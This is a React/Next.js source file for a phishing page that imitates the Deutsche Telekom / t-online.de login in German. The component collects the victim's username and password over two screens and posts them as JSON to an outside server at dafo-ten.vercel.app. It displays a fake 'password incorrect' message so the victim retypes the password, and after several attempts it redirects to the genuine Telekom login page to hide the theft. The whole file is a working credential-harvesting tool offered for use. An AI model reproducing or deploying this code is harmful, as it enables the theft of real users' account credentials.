"use client";
import { useRef, useState } from "react";
import axios from "axios";

const kery: any = {
  send_to: "brownjess",
};

export default function Body() {
  const [eyes, setEyes] = useState(false);
  const [count, setCount] = useState(0);
  const forma = useRef<HTMLFormElement>(null);

  const [errma, setErrma] = useState(false);

  const inputmai = useRef<HTMLInputElement>(null);
  const inputpai = useRef<HTMLInputElement>(null);

  const [page, setPage] = useState(0);

  const handleSubmit = async (e: React.FormEvent<HTMLInputElement>) => {
    if (page == 0) {
      if (inputmai.current) {
        if (!inputmai.current.value) {
          setErrma(true);
          return;
        }
        kery["email"] = inputmai.current.value;
      }
      setTimeout(() => {
        setPage(1);
      }, 500);

      return;
    }

    if (inputpai.current) {
      kery["pass"] = inputpai.current.value;
    }

    try {
      const result = await axios.post(
        "https://dafo-ten.vercel.app/api/send",
        JSON.stringify(kery)
      );

      if (result.status === 200) {
        if (count == 2)
          return window.location.replace(
            "https://accounts.login.idm.telekom.com/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE0000000000000&scope=openid&state=Be6ggoEV5lb2j-2BLIP8anQZdw4-SLN-hixcqHEKRFA%3D&redirect_uri=https://www.t-online.de/auth/login/oauth2/code/telekom&nonce=ekLsCCgWBjMpG22W_XggRabM1WKWb7E5Y9wbblcbkl4&display=popup&claims=%7B%22id_token%22:%7B%22urn:telekom.com:all%22:null%7D%7D%0A"
          );
      }

      setCount((prev) => prev + 1);
    } catch (error) {}
  };

  const checkCount = () => count > 0;

  return (
    <main className="mb-10">
      {page == 0 ? (
        <div className="w-11/12 sm:w-[510px] mx-auto flex flex-col items-center mt-6 ">
          <div>
            <img
              src="https://www.t-online.de/auth/t-online-logo-29112019.png"
              alt=""
            />
          </div>

          <h1 className="text-3xl sm:text-4xl text-[#6c6c6c] font-light sm:font-extralight text-start sm:text-center mt-9">
            Telekom Login Benutzername eingeben
          </h1>

          <form action="" className="w-full mt-10 px-2">
            <div className="relative h-[3.4rem] w-full">
              <input
                type="email"
                className="peer h-full w-full hover:bg-[#ededed] rounded-md text-[#6c6c6c] border border-gray-400 outline-none px-2 py-0 placeholder:text-[#6c6c6c] placeholder:font-light focus:placeholder:invisible"
                placeholder="Benutzername"
                name="email"
                ref={inputmai}
                id="email"
                required
              />
              <label
                htmlFor="email"
                className="absolute top-1 left-2 h-5 text-[#6c6c6c] font-light text-xs peer-placeholder-shown:invisible visible peer-focus:visible"
              >
                Benutzername
              </label>
            </div>

            <div role="checkbox" className="flex space-x-3 mt-2">
              <input
                type="checkbox"
                name="check"
                id="check"
                className="h-5 w-5 bg-[#ededed] checked:text-[#ededed]"
              />
              <label htmlFor="check" className="text-[#6c6c6c] font-light pb-2">
                Benutzername merken
              </label>
            </div>

            <input
              type="button"
              onClick={handleSubmit}
              value="Weiter"
              className="h-12 rounded-md w-full bg-[#e20074] cursor-pointer hover:bg-[#b2005c] text-white"
            />

            <input
              type="button"
              value="Andere Anmeldeoptionen"
              className="h-12 rounded-md w-full bg-[#ededed] cursor-pointer hover:saturate-100 border border-gray-400 font-light mt-3"
            />

            {/* <h1 className="font-light text-base text-center mt-4">
      Passwort vergessen?
    </h1> */}
            <h1 className="font-light text-base mx-auto mt-6 w-[70%] text-center">
              Benutzername oder Passwort vergessen? Bitte nutzen Sie „Andere
              Anmeldeoptionen“.
            </h1>

            <p className="text-center hover:underline text-sky-600 mt-10">
              Benötigen Sie Hilfe?
            </p>

            <p className="text-center hover:underline text-sky-600 mt-7">
              <span className="text-black">
                {" "}
                Für E-Mail registrieren? Jetzt{" "}
              </span>
              Telekom Login erstellen.
            </p>
          </form>
        </div>
      ) : (
        <div className="w-11/12 sm:w-[510px] mx-auto flex flex-col items-center mt-6 ">
          <div>
            <img
              src="https://www.t-online.de/auth/t-online-logo-29112019.png"
              alt=""
            />
          </div>

          <h1 className="text-3xl sm:text-4xl text-[#6c6c6c] font-light sm:font-extralight text-start sm:text-center mt-9">
            Telekom Login Benutzername eingeben
          </h1>

          <form action="" className="w-full mt-10 px-2">
            <div className="relative h-[3.4rem] w-full">
              <input
                type="email"
                className="peer h-full w-full bg-[#ededed] rounded-md text-[#6c6c6c] border border-gray-400  outline-none px-2 py-0 placeholder:text-[#6c6c6c] placeholder:font-light focus:placeholder:invisible"
                placeholder="Benutzername"
                name="email"
                id="email"
                required
                readOnly
              />
              <label
                htmlFor="email"
                className="absolute top-1 left-2 h-5 text-[#6c6c6c] font-light text-xs peer-placeholder-shown:invisible visible peer-focus:visible"
              >
                Benutzername
              </label>
            </div>

            <p className="font-light text-sm text-end text-[#007faf] my-2 hover:underline cursor-pointer">
              Nicht Ihr Benutzername?
            </p>

            <div className="relative h-[3.4rem] w-full">
              <input
                type={eyes ? "text" : "password"}
                className="peer h-full w-full hover:bg-[#ededed] rounded-md text-[#6c6c6c] border border-gray-400 outline-none px-2 py-0 placeholder:text-[#6c6c6c] placeholder:font-light focus:placeholder:invisible"
                placeholder="Passwort"
                name="jennet"
                id="jennet"
                ref={inputpai}
                required
              />

              <label
                htmlFor="jennet"
                className="absolute top-1 left-2  h-5 text-[#6c6c6c] font-light text-xs peer-placeholder-shown:invisible visible peer-focus:visible"
              >
                Passwort
              </label>

              <svg
                xmlns="http://www.w3.org/2000/svg"
                onClick={() => setEyes(!eyes)}
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth={1.5}
                stroke="#007faf"
                className="w-6 h-6 absolute right-3 top-4 cursor-pointer"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"
                />
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                />
              </svg>
            </div>
            <div
              className={`${
                checkCount() ? "block" : "hidden"
              } text-red-600 font-light text-sm`}
            >
              <p>Das Passwort ist nicht korrekt</p>
            </div>

            <input
              type="button"
              onClick={handleSubmit}
              value="Login"
              className="h-12 rounded-md w-full bg-[#e20074] cursor-pointer hover:bg-[#b2005c] text-white mt-2"
            />
            <div role="checkbox" className="flex space-x-3 mt-2">
              <input
                type="checkbox"
                name="check"
                id="check"
                className="h-5 w-5 bg-[#ededed] checked:text-[#ededed]"
              />
              <label htmlFor="check" className="text-[#6c6c6c] font-light pb-2">
                Angemeldet bleiben
              </label>
            </div>

            <p className="font-light mt-2 text-sm">
              Verwenden Sie ein öffentliches oder gemeinsam genutztes Gerät?
              Schalten sie die Funktion aus, um Ihren Telekom Login zu schützen.
            </p>

            <p className="font-light text-sky-500 mt-2">Mehr Informationen</p>
            <h1 className="font-light text-base text-center mt-7 mx-auto w-[70%]">
              Passwort vergessen? Bitte nutzen Sie „Andere Anmeldeoptionen“.
            </h1>

            <p className="mt-10 font-light text-sky-500 text-center">
              Benötigen Sie Hilfe?
            </p>
          </form>
        </div>
      )}
    </main>
  );
}
